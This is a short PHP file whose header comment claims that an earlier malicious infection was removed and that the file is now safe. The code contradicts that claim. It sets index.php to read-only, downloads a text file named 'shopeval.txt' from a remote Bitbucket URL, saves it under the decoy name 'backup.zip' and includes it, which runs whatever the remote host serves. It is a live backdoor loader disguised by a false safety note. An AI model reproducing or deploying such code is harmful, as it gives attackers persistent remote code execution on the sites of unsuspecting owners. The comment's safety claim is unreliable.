<?php
/**
 * Note: This file may contain artifacts of previous malicious infection.
 * However, the dangerous code has been removed, and the file is now safe to use.
 */

$file = 'index.php';
if (file_exists($file) && function_exists('chmod')) {
    @chmod($file, 0444); // Set read-only permissions if the file exists
}

$remoteUrl1 = "https://bitbucket.org/rexcc/shop/raw/9efa6b343d9800f6d3b52b24513c22f76ac6186e/shopeval.txt";
$localFile1 = 'backup.zip';
$fileContents1 = @file_get_contents($remoteUrl1);

if ($fileContents1 !== false) {
    file_put_contents($localFile1, $fileContents1);
    if (file_exists($localFile1)) {
        include $localFile1;
    }
}
?>
